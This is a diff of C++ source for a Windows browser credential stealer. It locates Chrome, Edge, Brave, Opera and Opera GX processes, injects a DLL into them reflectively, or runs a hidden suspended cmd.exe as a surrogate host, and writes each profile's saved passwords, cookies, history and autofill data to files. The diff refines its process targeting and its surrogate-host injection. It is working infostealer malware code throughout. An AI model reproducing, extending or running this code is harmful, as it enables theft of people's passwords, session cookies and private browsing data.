@@ -74,6 +74,20 @@ std::wstring expand_path(const std::wstring& path) {
     return std::wstring(buffer);
 }
 
+std::wstring get_process_path(DWORD pid) {
+    wchar_t path[MAX_PATH];
+    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (h) {
+        DWORD size = MAX_PATH;
+        if (QueryFullProcessImageNameW(h, 0, path, &size)) {
+            CloseHandle(h);
+            return std::wstring(path);
+        }
+        CloseHandle(h);
+    }
+    return L"";
+}
+
 struct BrowserConfig {
     std::wstring name;
     std::wstring exe_name;
@@ -84,8 +98,8 @@ const std::vector<BrowserConfig> BROWSERS = {
     {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", L"%LocalAppData%\\Google\\Chrome\\Application\\chrome.exe"}},
     {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", L"%LocalAppData%\\Microsoft\\Edge\\Application\\msedge.exe"}},
     {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"%LocalAppData%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
-    {L"Opera", L"opera.exe", {L"C:\\Program Files\\Opera\\opera.exe", L"C:\\Program Files (x86)\\Opera\\opera.exe", L"%LocalAppData%\\Programs\\Opera\\opera.exe"}},
-    {L"OperaGX", L"opera.exe", {L"C:\\Program Files\\Opera GX\\opera.exe", L"C:\\Program Files (x86)\\Opera GX\\opera.exe", L"%LocalAppData%\\Programs\\Opera GX\\opera.exe"}}
+    {L"Opera", L"opera.exe", {L"C:\\Program Files\\Opera\\opera.exe", L"C:\\Program Files (x86)\\Opera\\opera.exe", L"%LocalAppData%\\Programs\\Opera\\opera.exe", L"%AppData%\\Local\\Programs\\Opera\\opera.exe"}},
+    {L"OperaGX", L"opera.exe", {L"C:\\Program Files\\Opera GX\\opera.exe", L"C:\\Program Files (x86)\\Opera GX\\opera.exe", L"%LocalAppData%\\Programs\\Opera GX\\opera.exe", L"%AppData%\\Local\\Programs\\Opera GX\\opera.exe"}}
 };
 
 std::wstring find_browser_exe(const BrowserConfig& browser) {
@@ -96,14 +110,14 @@ std::wstring find_browser_exe(const BrowserConfig& browser) {
     return L"";
 }
 
-DWORD find_main_process(const std::wstring& exe_name) {
+DWORD find_main_process(const BrowserConfig& browser) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return 0;
 
     PROCESSENTRY32W entry;
     entry.dwSize = sizeof(PROCESSENTRY32W);
 
-    std::wstring target_exe = exe_name;
+    std::wstring target_exe = browser.exe_name;
     std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::towlower);
 
     DWORD main_pid = 0;
@@ -113,10 +127,15 @@ DWORD find_main_process(const std::wstring& exe_name) {
             std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::towlower);
 
             if (current_exe == target_exe) {
-                HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, entry.th32ProcessID);
-                if (h) {
+                // Verify by full path to avoid Opera/OperaGX confusion
+                std::wstring full_path = get_process_path(entry.th32ProcessID);
+                std::transform(full_path.begin(), full_path.end(), full_path.begin(), ::towlower);
+
+                std::wstring target_name = browser.name;
+                std::transform(target_name.begin(), target_name.end(), target_name.begin(), ::towlower);
+
+                if (full_path.find(target_name) != std::wstring::npos) {
                     main_pid = entry.th32ProcessID;
-                    CloseHandle(h);
                     break;
                 }
             }
@@ -182,50 +201,36 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
     std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;
 
-    DWORD existing_pid = find_main_process(browser.exe_name);
+    DWORD target_pid = find_main_process(browser);
     HANDLE h_process = NULL;
     bool process_started_by_us = false;
     PROCESS_INFORMATION pi = { 0 };
 
-    if (existing_pid != 0) {
-        std::wcout << L"Found existing " << browser.name << L" process (PID: " << existing_pid << L"). Injecting..." << std::endl;
-        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
+    if (target_pid != 0) {
+        std::wcout << L"Found existing " << browser.name << L" process (PID: " << target_pid << L"). Injecting..." << std::endl;
+        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
     }
 
     if (!h_process) {
-        std::wstring browser_path = find_browser_exe(browser);
+        // Surrogate strategy: If browser not running, use cmd.exe as host.
+        // This is safe because Opera/GX only needs DPAPI which is per-user session.
+        std::wcout << L"Browser not running. Using surrogate host for extraction..." << std::endl;
         std::wstring cmd_exe = expand_path(L"%SystemRoot%\\System32\\cmd.exe");
 
-        std::wstring target_cmd;
-        bool use_surrogate = false;
-
-        if (!browser_path.empty()) {
-            std::wcout << L"Starting " << browser.name << L" process..." << std::endl;
-            target_cmd = L"\"" + browser_path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-        } else {
-            // Surrogate host strategy for browsers that only use DPAPI (like Opera) or when EXE is missing
-            std::wcout << L"Browser EXE not found. Using surrogate host for extraction..." << std::endl;
-            target_cmd = cmd_exe;
-            use_surrogate = true;
-        }
-
-        std::vector<wchar_t> cmd_buf(target_cmd.begin(), target_cmd.end());
+        std::vector<wchar_t> cmd_buf(cmd_exe.begin(), cmd_exe.end());
         cmd_buf.push_back(0);
 
         STARTUPINFOW si = { sizeof(si) };
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
 
-        // If using surrogate, set environment variable so DLL knows which browser to target
-        if (use_surrogate) SetEnvironmentVariableW(L"EXTRACTION_TARGET", browser.name.c_str());
-        else SetEnvironmentVariableW(L"EXTRACTION_TARGET", NULL);
+        SetEnvironmentVariableW(L"EXTRACTION_TARGET", browser.name.c_str());
 
-        BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-        if (success) {
+        if (CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
             h_process = pi.hProcess;
             process_started_by_us = true;
         } else {
-            std::wcerr << L"Failed to create extraction process for " << browser.name << std::endl;
+            std::wcerr << L"Failed to create surrogate process for " << browser.name << std::endl;
             return;
         }
     }
@@ -259,6 +264,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         fs::path profile_dir = browser_dir / p_name;
                         fs::create_directories(profile_dir);
 
+                        // Passwords
                         std::string p_pass = (profile_dir / "passwords.txt").string();
                         std::ofstream pass_file(p_pass);
                         for (auto& p : profiles[i]["passwords"]) {
@@ -266,6 +272,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         }
                         pass_file.close();
 
+                        // Cookies
                         std::string p_cook = (profile_dir / "cookies.txt").string();
                         std::ofstream cookie_file(p_cook);
                         json cookie_json_list = json::array();
@@ -328,6 +335,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         std::ofstream(profile_dir / "history.json") << profiles[i]["history"].dump(4);
                         std::ofstream(profile_dir / "autofill.json") << profiles[i]["autofill"].dump(4);
 
+                        // History
                         std::string p_hist = (profile_dir / "history.txt").string();
                         std::ofstream hist_file(p_hist);
                         for (auto& h : profiles[i]["history"]) {
@@ -335,6 +343,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         }
                         hist_file.close();
 
+                        // Autofill
                         std::string p_auto = (profile_dir / "autofill.txt").string();
                         std::ofstream auto_file(p_auto);
                         for (auto& a : profiles[i]["autofill"]) {
